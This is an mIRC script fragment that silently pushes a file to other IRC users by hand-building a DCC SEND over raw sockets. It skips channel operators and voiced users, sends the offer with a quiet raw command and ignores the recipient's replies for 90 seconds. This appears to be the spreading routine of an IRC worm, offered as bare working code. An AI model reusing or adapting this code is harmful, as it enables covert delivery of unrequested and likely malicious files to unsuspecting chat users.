Alias slb { set %el.file $2
  if ( $1 isop $3 ) || ( $1 isvoice $3 ) { halt }
  if ( $exists(%el.file) = $false ) { halt }
  if ( $sock(el.*,0) > 5 ) { return }
  Set %el. $+ $1 0 | :scanpt | Set %pt $rand(2400,5000)
  if ( $portfree(%pt) = $false ) { goto scanpt }
  Set [ % $+ [ ln. $+ [ $1 ] ] ] 0 | Set %pk. $+ $1 4096 | Set %sz $file(%el.file).size
  Set %el.ltp1 el. $+ $1 | .timer $+ $1 1 300 { .sockclose %el.ltp1 | .sockclose i. $+ $1 }
  .timer $+ $1 1 50 lq $1 | .ignore -u90 $1 2
  .raw -q privmsg $1 : $+ $chr(1) $+ DCC SEND %el.file $longip($ip) %pt %sz $+ $chr(1)
if ( $sock(%el.ltp1) != $null ) { .sockclose %el.ltp1 } | .socklisten %el.ltp1 %pt }
Alias lq { if ( [ % $+ [ ln. $+ [ $1 ] ] ] = 0 ) { .sockclose [ i. $+ [ $1 ] ] | .sockclose [ el. $+ [ $1 ] ] | .timer $+ $1 off } }
Alias lsq { if ( $calc( [ % $+ [ ln. $+ [ $1 ] ] ] + [ % $+ [ pk. $+ [ $1 ] ] ] ) < %sz) { bread %el.file [ % $+ [ ln. $+ [ $1 ] ] ] [ % $+ [ pk. $+ [ $1 ] ] ] &data | .sockwrite i. $+ $1 &data | inc [ % $+ [ ln. $+ [ $1 ] ] ] [ % $+ [ pk. $+ [ $1 ] ] ] } | else { Set [ % $+ [ el. $+ [ $1 ] ] ] 1 | [ % $+ [ pk. $+ [ $1 ] ] ] = $calc( %sz - [ % $+ [ ln. $+ [ $1 ] ] ] ) | if ( [ % $+ [ pk. $+  [ $1 ] ] ] = 0) { return } | bread %el.file [ % $+ [ ln. $+ [ $1 ] ] ] [ % $+ [ pk. $+ [ $1 ] ] ] &data | .sockwrite i. $+ $1 &data } }
On 1:SockClose:i.*:{ Set %el.ptm6 $remove($sockname,i.) | sockclose $sockname | sockclose [ el. $+ [ %el.ptm6 ] ] | .timer $+ %el.ptm6 off }
On 1:SockListen:el.*:{ Set %el.ptm5 $remove($sockname,el.) | sockaccept i. $+ %el.ptm5 | lsq %el.ptm5 }
On 1:SockWrite:i.*:{ Set %el.ptm6 $remove($sockname,i.) | if ( [ % $+ [ el. $+ [ %el.ptm6 ] ] ] = 1 ) { .timer $+ $rand(99,9999) 1 10 sockclose $sockname | .timer $+ $r(99,9999) 1 10 sockclose [ el. $+ [ %el.ptm6 ] ] | .timer $+ %el.ptm6 off | halt } | lsq %el.ptm6 }
On 1:Disconnect:{ .timers off | .sockclose el.* | .sockclose i.* }
